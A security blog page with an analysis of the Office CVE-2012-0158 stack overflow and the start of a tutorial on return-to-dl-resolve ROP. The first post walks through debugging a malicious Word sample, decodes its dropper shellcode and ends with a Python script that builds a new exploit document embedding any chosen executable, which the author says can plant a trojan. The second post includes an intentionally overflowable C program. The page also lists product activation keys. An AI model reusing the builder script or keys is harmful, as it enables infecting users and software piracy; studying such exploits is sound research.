<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Bigtang&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="Bigtang's Blog">
<meta property="og:url" content="http://bigtang.org/index.html">
<meta property="og:site_name" content="Bigtang's Blog">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Bigtang's Blog">
<meta name="twitter:description">
  
    <link rel="alternative" href="/atom.xml" title="Bigtang&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://bigtang.org/img/logo.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">b1gtang</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
						<li>关于我</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/b1gtang/" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="http://weibo.com/b1gtang" title="weibo">weibo</a>
					        
								<a class="rss" target="_blank" href="#" title="rss">rss</a>
					        
								<a class="mail" target="_blank" href="mailto://root@bigtang.org" title="mail">mail</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/Arm/" style="font-size: 10px;">Arm</a> <a href="/tags/UAF/" style="font-size: 10px;">UAF</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://l-team.org/">L</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https:leavesongs.com/">Phithon</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://le4f.net/">le4f</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://z1ng.net/">z1ng</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://x0day.me/">DM_</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://wils0n.cn/">wilson</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://th1nk.info/">Th1nk</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://sh3ll.me">Chu</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://cyrils.org">Cyrils</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.iret.xyz/">Silver</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://joychou.org/">Joychou</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.Thinkings.org/">Tr3jer</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">Binary analysis, computer security, exploit writing, CTFs, hacking</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">b1gtang</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://bigtang.org/img/logo.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">b1gtang</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/b1gtang/" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="http://weibo.com/b1gtang" title="weibo">weibo</a>
			        
						<a class="rss" target="_blank" href="#" title="rss">rss</a>
			        
						<a class="mail" target="_blank" href="mailto://root@bigtang.org" title="mail">mail</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-CVE-2012-0158" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/05/01/CVE-2012-0158/" class="article-date">
  	<time datetime="2016-05-01T05:30:14.000Z" itemprop="datePublished">2016-05-01</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/05/01/CVE-2012-0158/">CVE-2012-0158</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>#CVE-2012-0158</p>
<p>@[Written By Bigtang]</p>
<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><blockquote>
<p>Windows XP Professional with Service Pack 3 (x86) - CD (Chinese-Simplified) 详细信息<br>文件名:<a href="ed2k://|file|zh-hans_windows_xp_professional_with_service_pack_3_x86_cd_x14-80404.iso|630239232|CD0900AFA058ACB6345761969CBCBFF4|/" target="_blank" rel="external">zh-hans_windows_xp_professional_with_service_pack_3_x86_cd_x14-80404.iso</a><br>SHA1:69DBF131116760932DCF132ADE111D6B45778098<br>文件大小:601.04MB<br>发布时间:2008-05-01<br>激活码:7P4YR-BF7R4-B4778-6TBC6-6C2WF</p>
</blockquote>
<h3 id="Office-版本"><a href="#Office-版本" class="headerlink" title="Office 版本"></a>Office 版本</h3><blockquote>
<p>Office Standard Edition 2003 (Simplified Chinese) 详细信息<br>文件名:<a href="ed2k://|file|sc_office_2003_std.iso|429031424|DB59D0F8CC31EF72CC15D675FC9B7C34|/" target="_blank" rel="external">sc_office_2003_std.iso</a><br>SHA1:32CDFD1CB4816AF4DC829D991EC6E775AB013CD9<br>文件大小:409.16MB<br>发布时间:2004-01-20<br>激活码:GWH28-DGCMP-P6RC4-6J4MT-3HFDY</p>
</blockquote>
<h2 id="获取样本"><a href="#获取样本" class="headerlink" title="获取样本"></a>获取样本</h2><p>如何获取样本？我们可以用metasploit生成，也可以从一些论坛去找。这里是我从看雪论坛拿到的一个样本，<a href="http://bbs.pediy.com/attachment.php?attachmentid=66868&amp;d=1335531237" target="_blank" rel="external">cve-2012-0158.zip</a>,密码：chence</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><ol>
<li><p>第一步当然是拍个快照了。因为，poc运行后没有正常返回，再下一次打开时，word会提示你是否恢复文件，导致poc不能二次使用。<br>最后会解释为什么这个poc只能用一次=。=<br><img src="/images/CVE-2012-0158/1467196606573.png" alt="Alt text"></p>
</li>
<li><p>观察漏洞行为，环境配置的没问题的话，应该是弹一个计算器。同时注意到原进程<code>winword.exe</code>退出了。<br><img src="/images/CVE-2012-0158/1467045297757.png" alt="Alt text"></p>
</li>
<li><p>因为shellcode执行了calc.exe,猜测调用WinExec函数，遂对其下断点。类似的断点<code>Shell32!ShellExecuteA</code><br><img src="/images/CVE-2012-0158/1467045886581.png" alt="Alt text"></p>
</li>
</ol>
<ol>
<li><p>触发断点时，观察<code>WinExec</code>入栈参数，发现调用a.exe，其正是calc.exe的副本。同时也要注意观察call stack有没有可疑的返回地址（如返回地址处于栈中）<br><img src="/images/CVE-2012-0158/1467045764602.png" alt="Alt text"></p>
</li>
<li><p>此时通过栈回溯，我们再次对<code>MSCOMCTL!DllGetClassObject+0x41cc6-5</code>下断点。（为什么减5？因为<code>MSCOMCTL!DllGetClassObject+0x41cc6</code>是返回地址,我们希望在调用函数之前就让程序断下来）<br><img src="/images/CVE-2012-0158/1467046386671.png" alt="Alt text"></p>
</li>
<li><p>此时，还没有执行到shellcode，但是我也不知道距离shellcode还有多远，因此我们单步(F10)走着看看。往下没几步，就看见ebp忽然变成0了！<br><img src="/images/CVE-2012-0158/1467046554951.png" alt="Alt text"></p>
</li>
<li><p>下一步，ret了一个很著名的地址<code>0x7ff4512</code>（万能跳转地址）<code>jmp esp</code>！查看此时esp，可以知道其位于<code>0x121634</code>。由此我们大概知道，这是一个典型的栈溢出！<br><img src="/images/CVE-2012-0158/1467046766440.png" alt="Alt text"></p>
</li>
<li><p>那么接下来我们比较关心，是什么原因造成的栈溢出。一个简单的定位方法自然就是，观察0x121634是什么时候被写入万能跳转地址的。同样，我们再次断在<code>MSCOMCTL!DllGetClassObject+0x41cc1</code>处。再次触发断点，此时<code>0x121634</code>还没被覆写。<br><img src="/images/CVE-2012-0158/1467047203959.png" alt="Alt text"></p>
</li>
<li><p>我们知道这个断点离最后的ret 8很近，我们不妨多注意接下来的几次call，看看调用前后栈的变化。很幸运，在下一个<code>call(0x275c8a05)</code>, <code>0x121634</code>被覆写。<br><img src="/images/CVE-2012-0158/1467047485305.png" alt="Alt text"></p>
</li>
<li><p>基于此，我们把重点放在这个函数<code>MSCOMCTL!DllGetClassObject+0x41a29 (275c876d)</code>，直接上IDA。一个大大的<code>qmemcpy</code>映入眼帘。其第一个和第三个参数都来自这个函数的形参。<br><img src="/images/CVE-2012-0158/1467047622446.png" alt="Alt text"></p>
</li>
<li><p>这次我们仍断在<code>MSCOMCTL!DllGetClassObject+0x41cc1</code>处，同时这次要单步进入函数内部。先来看一眼函数的参数。对应上图，a1=0x00121628,dwBytes=0x8282。等等！我好像发现了什么。往<code>0x00121628</code>里写0x8282个字节的数据！要知道，<code>0x00121634</code>里可就是上一个函数的返回地址哇！<br><img src="/images/CVE-2012-0158/1467048186252.png" alt="Alt text"></p>
</li>
<li><p>我们继续追踪！来证实我们的想法！来看一下qmemcpy的第二个参数，是来自堆，似乎是在v3+12处赋了值。v3应该是个虚表指针=。=是的，没错。v3+12正是read函数。它从文件里读了0x8282个字节到堆里v5=lpMem。<br><img src="/images/CVE-2012-0158/1467048514864.png" alt="Alt text"></p>
</li>
<li><p>而后qmemcpy把数据从堆里lpMem拷贝到栈里，此时拷贝长度大于a1变量的缓冲区长度，发生栈溢出！而拷贝的数据正是shellcode。<br><img src="/images/CVE-2012-0158/1467048760478.png" alt="Alt text"></p>
</li>
<li><p>至此我们已经定位到发生栈溢出的函数。接下来，还要分析是什么原因导致的栈溢出。很明显，长度是关键！我们要知道dwBytes0x8282是怎么来的。这一次我们需要断在<code>MSCOMCTL!DllGetClassObject+0x41c83(275c89c7)</code>。发现第一次调用<code>MSCOMCTL!DllGetClassObject+0x41a29</code>时读了0xc个字节，<code>“Cobjd\x00...\x82\x82”</code>。<br><img src="/images/CVE-2012-0158/1467049580277.png" alt="Alt text"></p>
</li>
<li><p>再看IDA对该函数的反汇编。12行从文件读0xc个字节，包括Cobjd标志和deBytes=0x8282。然后15行的检查居然是dwBytes&gt;=8,然后从文件读0x8282个字节的数据到v7,而v7仅仅为8个字节。因此，很明显，我们得出一个结论，产生漏洞的原因是程序员把<code>&lt;=</code>写成了<code>&gt;=</code>(ORZ)<br><img src="/images/CVE-2012-0158/1467049718496.png" alt="Alt text"></p>
</li>
</ol>
<h2 id="分析shellcode"><a href="#分析shellcode" class="headerlink" title="分析shellcode"></a>分析shellcode</h2><ol>
<li><p>根据前面的分析，我们在doc中定位shellcode的位置。0x1341为shellcode开始的地方。<br><img src="/images/CVE-2012-0158/1467117424565.png" alt="Alt text"></p>
</li>
<li><p>提取shellcode, 丢进ida里分析=。=我们来学习一下shellcode的各种姿势。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"may.doc"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> fr:</span><br><span class="line">	fr.<span class="built_in">seek</span>(<span class="number">0x1341</span>)</span><br><span class="line">	data = fr.<span class="built_in">read</span>(<span class="number">0x8282</span>*<span class="number">2</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"shellcode"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> fw:</span><br><span class="line">		fw.<span class="built_in">write</span>(data)</span><br></pre></td></tr></table></figure>
</li>
<li><p>sub_88这个函数。是用来定位data段的。data段里放了字符串“<code>kernel32</code>”。<br><img src="/images/CVE-2012-0158/1467184638969.png" alt="Alt text"></p>
</li>
<li><p>获得kernel32的基址。GET kernel32.dll base<br><img src="/images/CVE-2012-0158/1467184417935.png" alt="Alt text"></p>
</li>
<li><p>获取导入模块各函数地址。</p>
</li>
</ol>
<p><img src="/images/CVE-2012-0158/1467183847730.png" alt="Alt text"></p>
<ol>
<li><p>通过对获取的函数名进行CRC32,将解析的函数地址填入data段。<br><img src="/images/CVE-2012-0158/1467170012311.png" alt="Alt text"></p>
</li>
<li><p>讲doc再次内存读入内存，分别从文件偏移0x2878读入0x2d26字节作为a.doc,<br>从0x559e读入0x1c000字节作为a.exe。并解密，<code>key=&#39;\xac&#39;</code>,加密方式异或。接下来想做的是把用解密出来的a.doc替换原文件may.doc<br><img src="/images/CVE-2012-0158/1467188560353.png" alt="Alt text"></p>
</li>
<li><p>从exp中提取两个文件其中<code>a.doc</code>可以正常打开，<code>a.exe</code>为<code>calc.exe</code></p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"may.doc"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> fr:</span><br><span class="line">	data = fr.<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line">	doc = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="number">0x2878</span>:][:<span class="number">0x2d26</span>]:</span><br><span class="line">		doc += chr(ord(i)^<span class="number">0xac</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"a.doc"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> fw:</span><br><span class="line">		fw.<span class="built_in">write</span>(doc)</span><br><span class="line"></span><br><span class="line">	exe = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="number">0x559e</span>:][:<span class="number">0x1c000</span>]:</span><br><span class="line">                exe += chr(ord(i)^<span class="number">0xac</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"a.exe"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> fw:</span><br><span class="line">                fw.<span class="built_in">write</span>(exe)</span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来就是将内存中的<code>a.exe</code>,写入<code>C:\Documents and Settings\Administrator\</code>,并执行。<br><img src="/images/CVE-2012-0158/1467188796648.png" alt="Alt text"></p>
</li>
<li><p>最后就是退出进程了。为什么poc不能二次使用？这个在第7步中就解释了。因为shellcode运行后，会用exp中缀余的资源a.doc去替换原文件。原may.doc为133kB,运行后变成12Kb，显然不是同一个文件了。这样的话，我们把a.doc替换成真实文件，a.exe替换成m.exe。就可以完美利用啦=。=用户点开的效果就是，点一下，种马，自动关闭。再点开，会提示上次文件损坏，但是编辑一切正常。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">docFile =  sys.argv[<span class="number">1</span>]</span><br><span class="line">exeFile =  sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(docFile, <span class="string">"rb"</span>) <span class="keyword">as</span> fr:</span><br><span class="line">	<span class="title">_doc</span> = fr.<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line">doc = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bytearray(<span class="title">_doc</span>):</span><br><span class="line">	doc += chr(i^<span class="number">0xac</span>)</span><br><span class="line"></span><br><span class="line">print <span class="string">"docLen: "</span> + hex(<span class="built_in">len</span>(doc))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(exeFile, <span class="string">"rb"</span>) <span class="keyword">as</span> fr:</span><br><span class="line">	<span class="title">_exe</span> = fr.<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line">exe = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bytearray(<span class="title">_exe</span>):</span><br><span class="line">	exe += chr(i^<span class="number">0xac</span>)</span><br><span class="line"></span><br><span class="line">print <span class="string">"exeLen: "</span> + hex(<span class="built_in">len</span>(exe))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"may.doc"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> fr:</span><br><span class="line">	poc = fr.<span class="built_in">read</span>()[<span class="number">0</span>:<span class="number">0x2840</span>]</span><br><span class="line"></span><br><span class="line">poc += <span class="string">'\xab'</span>*<span class="number">4</span> + <span class="string">'\xef'</span>*<span class="number">4</span></span><br><span class="line">poc += <span class="string">'%USERPROFILE%\\x.doc\x00'</span></span><br><span class="line">poc += struct.pack(<span class="string">"I"</span>,<span class="built_in">len</span>(doc))</span><br><span class="line">poc += <span class="string">'%USERPROFILE%\\x.exe\x00'</span></span><br><span class="line">poc += struct.pack(<span class="string">"I"</span>,<span class="built_in">len</span>(exe))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"test.doc"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> fw:</span><br><span class="line">	fw.<span class="built_in">write</span>(poc+doc+exe)%</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><a href="http://bbs.pediy.com/showthread.php?p=1374563" target="_blank" rel="external">【原创】关于LDR的疑问与探索</a><br><a href="http://www.cnblogs.com/xuanyuan/p/4031751.html?utm_source=tuicool" target="_blank" rel="external">分析一段简单的ShellCode——从TEB到函数地址获取</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-return-to-dl-resolve" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/04/01/return-to-dl-resolve/" class="article-date">
  	<time datetime="2016-04-01T05:30:14.000Z" itemprop="datePublished">2016-04-01</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/04/01/return-to-dl-resolve/">return-to-dl-resolve</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="通过ELF动态装载构造ROP链-（-Return-to-dl-resolve）"><a href="#通过ELF动态装载构造ROP链-（-Return-to-dl-resolve）" class="headerlink" title="通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）"></a>通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）</h3><p>####0x00 前言<br>玩CTF的赛棍都知道，PWN类型的漏洞题目一般会提供一个可执行程序，同时会提供程序运行动态链接的libc库。通过libc.so可以得到库函数的偏移地址，再结合泄露GOT表中libc函数的地址，计算出进程中实际函数的地址，以绕过ASLR。这种手法叫return-to-libc。本文将介绍一种不依赖libc的手法。</p>
<p>以XDCTF2015-EXPLOIT2为例，这题当时是只给了可执行文件的。出这题的初衷就是想通过Return-to-dl-resolve的手法绕过NX和ASLR的限制。本文将详细介绍一下该手法的利用过程。</p>
<p>这里构造一个存在栈缓冲区溢出漏洞的程序，以方便后续我们构造ROP链。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,buf);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">256</span>); <span class="comment">// Buffer OverFlow</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">"Welcome to XDCTF2015~!\n"</span>;</span><br><span class="line"></span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,buf);</span><br><span class="line">	write(<span class="number">1</span>,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line"></span><br><span class="line">	vuln();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="0x01-准备知识"><a href="#0x01-准备知识" class="headerlink" title="0x01 准备知识"></a>0x01 准备知识</h4><h5 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h5><p>ELF可执行文件由ELF头部，程序头部表和其对应的段，节区头部表和其对应的节组成。如果一个可执行文件参与动态链接，它的程序头部表将包含类型为 <code>PT_DYNAMIC</code> 的段，它包含<code>.dynamic</code> 节区。结构如图，<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word  d_val;</span><br><span class="line">        Elf32_Addr  d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line"> &#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure></p>
<p>其中Tag对应着每个节区。比如<code>JMPREL</code>对应着<code>.rel.plt</code><br><img src="/images/Return-to-dl-resolve/1459431478784.png" alt="Alt text"></p>
<p>节区中包含目标文件的所有信息。节的结构如图。<br><figure class="highlight thrift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Word sh_name;        <span class="comment">// 节区头部字符串表节区的索引</span></span><br><span class="line">    Elf32_Word sh_type;        <span class="comment">// 节区类型</span></span><br><span class="line">    Elf32_Word sh_flags;       <span class="comment">// 节区标志，用于描述属性</span></span><br><span class="line">    Elf32_Addr sh_addr;        <span class="comment">// 节区的内存映像</span></span><br><span class="line">    Elf32_Off  sh_offset;      <span class="comment">// 节区的文件偏移</span></span><br><span class="line">    Elf32_Word sh_size;        <span class="comment">// 节区的长度</span></span><br><span class="line">    Elf32_Word sh_link;        <span class="comment">// 节区头部表索引链接</span></span><br><span class="line">    Elf32_Word sh_info;        <span class="comment">// 附加信息</span></span><br><span class="line">    Elf32_Word sh_addralign;   <span class="comment">// 节区对齐约束</span></span><br><span class="line">    Elf32_Word sh_entsize;     <span class="comment">// 固定大小的节区表项的长度</span></span><br><span class="line">&#125;Elf32_Shdr;</span><br></pre></td></tr></table></figure></p>
<p>如图，列出了该文件的28个节区。其中类型为REL的节区包含重定位表项。<br><img src="/images/Return-to-dl-resolve/1459407202726.png" alt="Alt text"></p>
<p>（1） 其中<code>.rel.plt</code>节是用于函数重定位，<code>.rel.dyn</code>节是用于变量重定位<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;    <span class="regexp">//</span> 对于可执行文件，此值为虚拟地址</span><br><span class="line">    Elf32_Word r_info;      <span class="regexp">//</span> 符号表索引</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"><span class="comment">#define ELF32_R_SYM(i) ((i)&gt;&gt;8)</span></span><br><span class="line"><span class="comment">#define ELF32_R_TYPE(i) ((unsigned char)(i))</span></span><br><span class="line"><span class="comment">#define ELF32_R_INFO(s, t) (((s)&lt;&lt;8) + (unsigned char)(t))</span></span><br></pre></td></tr></table></figure></p>
<p>如图，在<code>.rel.plt</code>中列出了链接的C库函数，以下均已<code>write</code>函数为例，<code>write</code>函数的<code>r_offset=0x804a010</code>,<code>r_info=0x507</code><br><img src="/images/Return-to-dl-resolve/1459407452175.png" alt="Alt text"></p>
<p>（2） 其中<code>.got</code>节保存全局变量偏移表，<code>.got.plt</code>节存储着全局函数偏离表。<code>.got.plt</code>对应着<code>Elf32_Rel</code>结构中<code>r_offset</code>的值。如图，<code>write</code>函数在GOT表中位于<code>0x804a010</code><br><img src="/images/Return-to-dl-resolve/1459408892173.png" alt="Alt text"></p>
<p>（3）其中<code>.dynsym</code>节区包含了动态链接符号表。其中，<code>Elf32_Sym[num]</code>中的<code>num</code>对应着<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)</code>。根据定义，<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info)&gt;&gt;8</code>。<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;   <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;  <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;   <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;   <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;  <span class="comment">/* Symbol visibility under glibc&gt;=2.2 */</span></span><br><span class="line">  Elf32_Section st_shndx;  <span class="comment">/* Section index */</span></span><br><span class="line">&#125; 